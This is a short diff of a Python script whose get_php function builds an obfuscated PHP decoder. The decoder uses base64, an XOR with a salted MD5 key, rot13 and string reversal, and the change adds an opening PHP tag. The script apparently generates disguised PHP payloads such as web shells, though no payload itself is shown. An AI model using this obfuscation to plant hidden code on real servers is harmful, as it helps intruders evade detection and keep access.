@@ -399,7 +399,7 @@ def get_php(keyword: int, passwd: str, salt: str):
         "\\0"
     ]
 
-    header = """function dept($data,$salt="%s",$change=0x80){$data=base64_decode($data);$saltm = md5($salt);$len = strlen($data);$pass=strrev(str_rot13(substr(strrev($data^str_repeat($saltm,ceil($len / 32)) ^ str_repeat(chr($change),$len)),0,-32)));return $pass;}""" % (
+    header = """<?php\nfunction dept($data,$salt="%s",$change=0x80){$data=base64_decode($data);$saltm = md5($salt);$len = strlen($data);$pass=strrev(str_rot13(substr(strrev($data^str_repeat($saltm,ceil($len / 32)) ^ str_repeat(chr($change),$len)),0,-32)));return $pass;}""" % (
         salt)
 
     result = getAuto(words=words, rule=rule)
